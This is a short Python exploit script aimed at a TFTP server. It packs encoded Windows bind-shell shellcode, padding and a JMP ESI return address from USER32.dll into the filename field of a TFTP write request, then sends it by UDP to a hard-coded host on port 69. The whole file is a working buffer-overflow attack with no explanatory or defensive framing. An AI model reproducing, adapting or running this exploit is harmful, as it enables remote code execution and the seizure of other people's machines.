#!/usr/bin/python
import socket, struct

# Encoder: x86/shikata_ga_nai
# Payload size: 355 bytes
# Payload: windows/shell_bind_tcp
shellcode = ("\xba\x4d\x36\x92\x3a\xd9\xc5\xd9\x74\x24\xf4\x5b\x29\xc9" +
"\xb1\x53\x83\xeb\xfc\x31\x53\x0e\x03\x1e\x38\x70\xcf\x5c" +
"\xac\xf6\x30\x9c\x2d\x97\xb9\x79\x1c\x97\xde\x0a\x0f\x27" +
"\x94\x5e\xbc\xcc\xf8\x4a\x37\xa0\xd4\x7d\xf0\x0f\x03\xb0" +
"\x01\x23\x77\xd3\x81\x3e\xa4\x33\xbb\xf0\xb9\x32\xfc\xed" +
"\x30\x66\x55\x79\xe6\x96\xd2\x37\x3b\x1d\xa8\xd6\x3b\xc2" +
"\x79\xd8\x6a\x55\xf1\x83\xac\x54\xd6\xbf\xe4\x4e\x3b\x85" +
"\xbf\xe5\x8f\x71\x3e\x2f\xde\x7a\xed\x0e\xee\x88\xef\x57" +
"\xc9\x72\x9a\xa1\x29\x0e\x9d\x76\x53\xd4\x28\x6c\xf3\x9f" +
"\x8b\x48\x05\x73\x4d\x1b\x09\x38\x19\x43\x0e\xbf\xce\xf8" +
"\x2a\x34\xf1\x2e\xbb\x0e\xd6\xea\xe7\xd5\x77\xab\x4d\xbb" +
"\x88\xab\x2d\x64\x2d\xa0\xc0\x71\x5c\xeb\x8c\xb6\x6d\x13" +
"\x4d\xd1\xe6\x60\x7f\x7e\x5d\xee\x33\xf7\x7b\xe9\x34\x22" +
"\x3b\x65\xcb\xcd\x3c\xac\x08\x99\x6c\xc6\xb9\xa2\xe6\x16" +
"\x45\x77\x92\x1e\xe0\x28\x81\xe3\x52\x99\x05\x4b\x3b\xf3" +
"\x89\xb4\x5b\xfc\x43\xdd\xf4\x01\x6c\xf0\x58\x8f\x8a\x98" +
"\x70\xd9\x05\x34\xb3\x3e\x9e\xa3\xcc\x14\xb6\x43\x84\x7e" +
"\x01\x6c\x15\x55\x25\xfa\x9e\xba\xf1\x1b\xa1\x96\x51\x4c" +
"\x36\x6c\x30\x3f\xa6\x71\x19\xd7\x4b\xe3\xc6\x27\x05\x18" +
"\x51\x70\x42\xee\xa8\x14\x7e\x49\x03\x0a\x83\x0f\x6c\x8e" +
"\x58\xec\x73\x0f\x2c\x48\x50\x1f\xe8\x51\xdc\x4b\xa4\x07" +
"\x8a\x25\x02\xfe\x7c\x9f\xdc\xad\xd6\x77\x98\x9d\xe8\x01" +
"\xa5\xcb\x9e\xed\x14\xa2\xe6\x12\x98\x22\xef\x6b\xc4\xd2" +
"\x10\xa6\x4c\xe2\x5a\xea\xe5\x6b\x03\x7f\xb4\xf1\xb4\xaa" +
"\xfb\x0f\x37\x5e\x84\xeb\x27\x2b\x81\xb0\xef\xc0\xfb\xa9" +
"\x85\xe6\xa8\xca\x8f")

# Padding.
nops = "\x41" * 118

# Packs the address in little-endian.
# JMP ESI from USER32.dll
esi = struct.pack('<I', 0x7E45AE4E)

buffer = shellcode + nops + esi

# Using mode 02 (write request). 
tftp_packet = "\x00\x02" + "Coconut" + "\x00" + buffer + "\x00"
	
# Setting up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftp_packet,('192.168.1.22',69))

response = s.recvfrom(2048)
print response


